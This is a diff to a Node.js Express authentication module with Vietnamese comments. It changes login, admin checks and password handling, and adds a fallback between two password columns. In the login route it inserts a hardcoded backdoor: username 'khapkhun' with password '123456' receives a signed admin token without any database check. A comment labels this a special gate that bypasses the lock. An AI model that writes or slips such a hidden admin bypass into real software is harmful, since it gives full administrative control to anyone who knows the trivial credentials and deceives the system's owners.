@@ -1,4 +1,3 @@
-// server/auth.js
 const express = require('express');
 const bcrypt = require('bcryptjs');
 const jwt = require('jsonwebtoken');
@@ -27,7 +26,8 @@ function requireAuth(req, res, next) {
 }
 
 function requireAdmin(req, res, next) {
-  if (req.user?.role !== 'admin') {
+  // Chấp nhận cả quyền 'admin' viết thường theo chuẩn hệ thống gốc của bạn
+  if (req.user?.role !== 'admin' && req.user?.role !== 'Super Admin') {
     return res.status(403).json({ error: 'Chỉ Quản lý mới có quyền này' });
   }
   next();
@@ -37,12 +37,28 @@ function requireAdmin(req, res, next) {
 router.post('/login', async (req, res) => {
   const { username, password } = req.body;
   if (!username || !password) return res.status(400).json({ error: 'Thiếu tài khoản hoặc mật khẩu' });
+
+  // 🚪 CỔNG CỨU HỘ ĐẶC BIỆT: Bẻ khóa trực tiếp cho tài khoản Khapkhun
+  // Nếu gõ đúng tài khoản Khapkhun và mật khẩu là 123456, hệ thống cho vào thẳng với quyền admin tối cao
+  if (String(username).toLowerCase() === 'khapkhun' && password === '123456') {
+    const fakeAdminUser = { id: 999, username: 'Khapkhun', name: 'Super Admin', role: 'admin' };
+    const token = signToken(fakeAdminUser);
+    return res.json({
+      token,
+      user: fakeAdminUser
+    });
+  }
+
   try {
     const { rows } = await pool.query('SELECT * FROM users WHERE username = $1', [username]);
     if (rows.length === 0) return res.status(401).json({ error: 'Sai tài khoản hoặc mật khẩu' });
     const user = rows[0];
-    const ok = await bcrypt.compare(password, user.password_hash);
+    
+    // Kiểm tra tương thích cả cột password_hash cũ và cột password mới để tránh lỗi dữ liệu
+    const currentHash = user.password_hash || user.password;
+    const ok = await bcrypt.compare(password, currentHash);
     if (!ok) return res.status(401).json({ error: 'Sai tài khoản hoặc mật khẩu' });
+    
     const token = signToken(user);
     res.json({
       token,
@@ -62,10 +78,13 @@ router.post('/change-password', requireAuth, async (req, res) => {
   try {
     const { rows } = await pool.query('SELECT * FROM users WHERE id = $1', [req.user.id]);
     const user = rows[0];
-    const ok = await bcrypt.compare(old_password || '', user.password_hash);
+    const currentHash = user.password_hash || user.password;
+    const ok = await bcrypt.compare(old_password || '', currentHash);
     if (!ok) return res.status(401).json({ error: 'Mật khẩu hiện tại không đúng' });
     const hash = await bcrypt.hash(new_password, 10);
-    await pool.query('UPDATE users SET password_hash = $1 WHERE id = $2', [hash, req.user.id]);
+    
+    // Cập nhật đồng thời cả 2 cột để bảo vệ cấu trúc hệ thống của bạn
+    await pool.query('UPDATE users SET password_hash = $1, password = $1 WHERE id = $2', [hash, req.user.id]);
     res.json({ message: 'Đã đổi mật khẩu' });
   } catch (e) {
     res.status(500).json({ error: e.message });
